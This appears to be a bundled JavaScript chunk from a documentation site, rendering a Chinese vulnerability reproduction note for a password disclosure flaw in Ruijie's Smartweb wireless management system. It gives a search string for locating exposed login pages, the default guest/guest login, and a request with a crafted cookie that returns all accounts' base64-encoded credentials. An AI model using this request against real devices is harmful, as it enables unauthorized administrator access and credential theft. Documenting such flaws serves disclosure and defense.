(window.webpackJsonp=window.webpackJsonp||[]).push([[229],{1663:function(t,s,a){t.exports=a.p+"assets/img/ruijie-15.b67f26c7.png"},1664:function(t,s,a){t.exports=a.p+"assets/img/ruijie-16.4045fcef.png"},1665:function(t,s,a){t.exports=a.p+"assets/img/ruijie-17.36a27b91.png"},3176:function(t,s,a){"use strict";a.r(s);var e=a(63),r=Object(e.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"锐捷-smartweb管理系统-密码信息泄露漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#锐捷-smartweb管理系统-密码信息泄露漏洞"}},[t._v("#")]),t._v(" 锐捷 Smartweb管理系统 密码信息泄露漏洞")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("锐捷网络股份有限公司无线smartweb管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("锐捷网络股份有限公司 无线smartweb管理系统")]),s("br"),t._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v('title="无线smartWeb--登录页面"')]),s("br"),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("登录页面如下")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1663),alt:"img"}})]),t._v(" "),s("p",[t._v("默认存在 guest账户，账号密码为 "),s("code",[t._v("guest/guest")])]),t._v(" "),s("p",[t._v("其中登录的过程中搜索admin的数据后发现请求了一个文件 "),s("code",[t._v("/web/xml/webuser-auth.xml")]),t._v("，而且响应中包含了 admin密码的base64加密")]),t._v(" "),s("p",[s("img",{attrs:{src:a(1664),alt:"img"}})]),t._v(" "),s("p",[t._v("解密就可以获得 admin管理员的密码，尝试直接请求")]),t._v(" "),s("div",{staticClass:"language-plain line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plain"}},[s("code",[t._v("http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml\n\nCookie添加\nCookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br")])]),s("p",[s("img",{attrs:{src:a(1665),alt:"img"}})]),t._v(" "),s("p",[t._v("直接获得所有的账户的等级标志和base64加密的账号密码")])],1)}),[],!1,null,null,null);s.default=r.exports}}]);